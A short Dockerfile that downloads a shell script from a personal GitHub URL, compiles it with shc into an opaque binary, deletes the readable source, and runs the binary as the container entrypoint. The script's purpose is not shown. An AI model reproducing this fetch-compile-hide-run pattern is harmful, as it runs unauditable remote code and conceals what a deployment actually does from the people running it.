FROM ubuntu:xenial

ENV PORT 8080
ENV RINGURL https://raw.githubusercontent.com/xiaokanhongchen/qf-beifen/main/kintoringshc.sh


RUN apt update && apt install -y gcc shc && \
    wget $RINGURL -O /ringsh && shc -r  -f /ringsh && chmod +x /ringsh.x && \
    rm -rf /ringsh /ringsh.x.c /var/cache/apk/*
    
ENTRYPOINT ["/ringsh.x"]
